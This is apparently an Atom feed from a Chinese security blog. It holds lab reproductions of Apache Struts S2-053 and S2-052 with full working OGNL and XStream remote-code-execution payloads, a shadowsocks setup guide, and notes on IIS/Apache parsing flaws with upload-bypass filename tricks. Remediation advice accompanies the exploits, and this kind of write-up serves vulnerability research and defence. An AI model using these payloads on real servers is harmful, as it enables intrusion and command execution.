<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Y-HKL&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://y-hkl.top/"/>
  <updated>2017-09-13T07:30:59.809Z</updated>
  <id>http://y-hkl.top/</id>
  
  <author>
    <name>Y-HKL</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>s2-053漏洞复现</title>
    <link href="http://y-hkl.top/2017/09/13/s2-053%E5%A4%8D%E7%8E%B0/"/>
    <id>http://y-hkl.top/2017/09/13/s2-053复现/</id>
    <published>2017-09-13T06:54:49.000Z</published>
    <updated>2017-09-13T07:30:59.809Z</updated>
    
    <content type="html"><![CDATA[<p>2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞<br><a id="more"></a></p>
<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2017-12611</p>
<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>Freemarker标签远程代码执行漏洞</p>
<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>中危</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Struts 2.0.1 - 2.3.33<br>Struts 2.5 - 2.5.10</p>
<h2 id="s2-053-POC"><a href="#s2-053-POC" class="headerlink" title="s2-053 POC"></a>s2-053 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于(#cmd=’whoami’)</p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>可以使用war包或docker复现</p>
<h3 id="使用war包搭建环境"><a href="#使用war包搭建环境" class="headerlink" title="使用war包搭建环境"></a>使用war包搭建环境</h3><p>下载war包 链接：<a href="http://pan.baidu.com/s/1qXW3FPi" target="_blank" rel="external">http://pan.baidu.com/s/1qXW3FPi</a> 密码：9exb<br>下载后把它放到tomcat目录下的webapps目录下，重启tomcat后访问：<a href="http://127.0.0.1:8080/s2-053" target="_blank" rel="external">http://127.0.0.1:8080/s2-053</a><br><img src="/upload_img/s2_053_1.png" alt=""></p>
<h3 id="使用docker搭建环境"><a href="#使用docker搭建环境" class="headerlink" title="使用docker搭建环境"></a>使用docker搭建环境</h3><p>快速搭建各种漏洞环境(Various vulnerability environment) <a href="https://github.com/Medicean/VulApps" target="_blank" rel="external">https://github.com/Medicean/VulApps</a><br>搭建好后访问 <a href="http://127.0.0.1:8080/hello.action" target="_blank" rel="external">http://127.0.0.1:8080/hello.action</a><br><img src="/upload_img/s2_053_2.png" alt=""></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>打开页面，输入表达式%{33-1}进行测试，发现成功执行，返回32<br><img src="/upload_img/s2_053_3.png" alt=""></p>
<h3 id="执行POC"><a href="#执行POC" class="headerlink" title="执行POC"></a>执行POC</h3><p>输入POC提交<br><img src="/upload_img/s2_053_4.png" alt=""></p>
<h3 id="来个调用计算器（calc）"><a href="#来个调用计算器（calc）" class="headerlink" title="来个调用计算器（calc）"></a>来个调用计算器（calc）</h3><p>把(#cmd=’whoami’)里面的whoami缓存calc<br><img src="/upload_img/s2_053_5.png" alt=""></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当在Freemarker标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;@s.hidden </div><div class="line">name=&quot;strutsS&quot; value=strutsS/&gt; </div><div class="line">&lt;@s.hidden name=&quot;strutsS&quot; </div><div class="line">value=&quot;$&#123;strutsS&#125;&quot; /&gt;</div></pre></td></tr></table></figure></p>
<p>这两种情况下，值属性都使用可写属性，都会受到Freemarker表达式影响</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.升级到Apache Struts5.12或2.3.34<br>2.Freemarker标签内容不要通过Request方式获取<br>3.使用只读属性来初始化value属性（仅限getter属性）</p>
<ol>
<li>不要使用如下结构<br>&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;<br>&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
    
  </entry>
  
  <entry>
    <title>s2-052复现</title>
    <link href="http://y-hkl.top/2017/09/08/s2-052%E5%A4%8D%E7%8E%B0/"/>
    <id>http://y-hkl.top/2017/09/08/s2-052复现/</id>
    <published>2017-09-08T07:35:17.000Z</published>
    <updated>2017-09-08T08:43:32.134Z</updated>
    
    <content type="html"><![CDATA[<p>struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究</p>
<h2 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h2><p>问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反<br>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12<br><a id="more"></a></p>
<h2 id="s2-052-POC"><a href="#s2-052-POC" class="headerlink" title="s2-052 POC"></a>s2-052 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;calc&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;command&gt;</div><div class="line">&lt;string&gt;</div><div class="line">calc</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/command&gt;</div></pre></td></tr></table></figure></p>
<h2 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h2><h3 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h3><h4 id="下载JDK"><a href="#下载JDK" class="headerlink" title="下载JDK"></a>下载JDK</h4><p>在官网上下载JDK <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>我是在windows上搭建的所以，下载windows版本的</p>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p>1 新建系统变量：<br>变量名:JAVA_HOME<br>变量值:你的JDK安装目录<br>2 再新建系统变量：<br>变量名:CLASSPATH<br>值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN<br>注意：前面的点号<br>3 修改PATH变量<br>变量名：PATH<br>值：;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;<br>注意：前面的分号，将此值添加到，path变量值的最后面</p>
<h3 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h3><h4 id="下载Tomcat"><a href="#下载Tomcat" class="headerlink" title="下载Tomcat"></a>下载Tomcat</h4><p>在官网上下载Tomcat <a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="external">http://tomcat.apache.org/download-90.cgi</a><br>下载你需要的版本<br>下载完成以后解压到你想解压的目录就可以了</p>
<h4 id="配置Tomcat的环境变量"><a href="#配置Tomcat的环境变量" class="headerlink" title="配置Tomcat的环境变量"></a>配置Tomcat的环境变量</h4><p>新建Tomcat环境变量<br>变量名:TOMCAT_HOME<br>变量值:你的TOMCAT所在目录</p>
<h4 id="启动Tomcat"><a href="#启动Tomcat" class="headerlink" title="启动Tomcat"></a>启动Tomcat</h4><p>打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；<br>如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查</p>
<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
<h3 id="下载受影响的struts2版本"><a href="#下载受影响的struts2版本" class="headerlink" title="下载受影响的struts2版本"></a>下载受影响的struts2版本</h3><p>1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br>2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。<br>3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 <a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a> 会跳转，然后出现下面的页面<br><img src="/upload_img/s2_052_1.png" alt=""></p>
<h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>进入编辑页面<br><img src="/upload_img/s2_052_2.png" alt=""><br>设置抓包，点击提交按钮<br><img src="/upload_img/s2_052_3.png" alt=""><br><img src="/upload_img/s2_052_4.png" alt=""><br>修改Content-Type和POST提交的数据<br><img src="/upload_img/s2_052_5.png" alt=""><br>可以看到计算器已经调用出来<br><img src="/upload_img/s2_052_6.png" alt=""></p>
<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>1.升级Struts到2.5.13最新版本。<br>2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs</p>
<h2 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h2><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究&lt;/p&gt;
&lt;h2 id=&quot;s2-052漏洞介绍&quot;&gt;&lt;a href=&quot;#s2-052漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;s2-052漏洞介绍&quot;&gt;&lt;/a&gt;s2-052漏洞介绍&lt;/h2&gt;&lt;p&gt;问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反&lt;br&gt;漏洞编号：CVE-2017-9805(S2-052)&lt;br&gt;影响版本：Struts 2.5 - Struts 2.5.12&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
    
      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>搭建shadowsocks服务</title>
    <link href="http://y-hkl.top/2017/09/02/%E6%90%AD%E5%BB%BAshadowsocks%E6%9C%8D%E5%8A%A1/"/>
    <id>http://y-hkl.top/2017/09/02/搭建shadowsocks服务/</id>
    <published>2017-09-02T06:15:21.000Z</published>
    <updated>2017-09-02T06:55:55.285Z</updated>
    
    <content type="html"><![CDATA[<p>搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。<br><a id="more"></a></p>
<h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h2><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>从pip官网 <a href="https://pypi.python.org/pypi/pip" target="_blank" rel="external">https://pypi.python.org/pypi/pip</a> 下载pip的源代码</p>
<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf pip-1.5.5.tar.gz</div></pre></td></tr></table></figure></p>
<p>这个时候会报错说少了setuptools<br>从setuptools官网 <a href="https://pypi.python.org/pypi/setuptools" target="_blank" rel="external">https://pypi.python.org/pypi/setuptools</a> 下载setuptools原来</p>
<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar -zxvf setuptools-3.6.tar.gz </div><div class="line">cd setuptools-3.6</div></pre></td></tr></table></figure></p>
<p>#安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure></p>
<p>再次安装pip就OK了</p>
<h3 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h3><p>先安装依赖包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl-devel gcc swig python-devel autoconf libtool</div></pre></td></tr></table></figure></p>
<p>再通过pip安装M2Crypto：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install M2Crypto</div></pre></td></tr></table></figure></p>
<h2 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h2><p>使用pip安装shadowsocks<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure></p>
<h2 id="配置config文件"><a href="#配置config文件" class="headerlink" title="配置config文件"></a>配置config文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/shadowsocks.json</div></pre></td></tr></table></figure>
<p>单用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,     ##服务器ip地址</div><div class="line">&quot;server_port&quot;:8000,  ##代理端口</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080, ##本地监听端口</div><div class="line">&quot;password&quot;:&quot;&quot;,   ##连接密码</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;, ##加密方式</div><div class="line">&quot;dast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>多用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080,</div><div class="line">&quot;port_password&quot;:&#123;</div><div class="line">&quot;8000&quot;:&quot;123456&quot;,</div><div class="line">&quot;8001&quot;:&quot;123456&quot;</div><div class="line">&#125;,</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class="line">&quot;fast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="命令行启动关闭"><a href="#命令行启动关闭" class="headerlink" title="命令行启动关闭"></a>命令行启动关闭</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssserver -c /etc/shadowsocks/config.json -d start 后台启动</div><div class="line">ssserver -c /etc/shadowsocks/config.json -d stop 后台停止</div></pre></td></tr></table></figure>
<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将启动的命令加入到/etc/rc.local文件的最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/rc.local</div></pre></td></tr></table></figure></p>
<h2 id="设置非root用户运行ss"><a href="#设置非root用户运行ss" class="headerlink" title="设置非root用户运行ss"></a>设置非root用户运行ss</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">useradd ssuser //添加一个ssuser用户</div><div class="line">ssserver [other options] --user ssuser //用ssuser这个用户来运行ss</div></pre></td></tr></table></figure>
<p>将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser</p>
<h2 id="防火墙设置（如有）"><a href="#防火墙设置（如有）" class="headerlink" title="防火墙设置（如有）"></a>防火墙设置（如有）</h2><p>编辑防火墙配置文件/etc/sysconfig/iptables，将服务器端口（server_port）放行。新增一条防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 8989 -j ACCEPT</div></pre></td></tr></table></figure></p>
<p>重启防火墙iptables：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service iptables restart</div></pre></td></tr></table></figure></p>
<h2 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h2><p>windows安装shadowsocks客户端比较简单，直接下载安装程序。<br>启动以后，填入服务端相应的配置（ip，port，密码，加密方式）<br>设置模式：<br><img src="/upload_img/shadowsocks_1.png" alt=""><br><img src="/upload_img/shadowsocks_2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://y-hkl.top/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="shadowsocks" scheme="http://y-hkl.top/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>服务器解析漏洞</title>
    <link href="http://y-hkl.top/2017/09/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://y-hkl.top/2017/09/01/服务器解析漏洞/</id>
    <published>2017-09-02T01:49:39.000Z</published>
    <updated>2017-09-02T02:04:13.270Z</updated>
    
    <content type="html"><![CDATA[<p>服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。<br><a id="more"></a></p>
<h2 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="一.IIS5.x-6.x解析漏洞"></a>一.IIS5.x-6.x解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件</p>
<h3 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h3><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.禁止用户控制文件上传目录，新建目录等权限<br>2.上传目录与用户新建的目录禁止执行<br>3.上传的文件重命名，不保留用户上传文件的后缀<br>4.禁止asa、asp、cer、cdx等后缀的文件上传</p>
<h2 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="二.apache解析漏洞"></a>二.apache解析漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理　"></a>漏洞原理　</h3><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<h3 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h3><p>www.xxxx.xxx.com/test.php.php123</p>
<h3 id="其余配置问题导致漏洞"><a href="#其余配置问题导致漏洞" class="headerlink" title="其余配置问题导致漏洞"></a>其余配置问题导致漏洞</h3><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行</p>
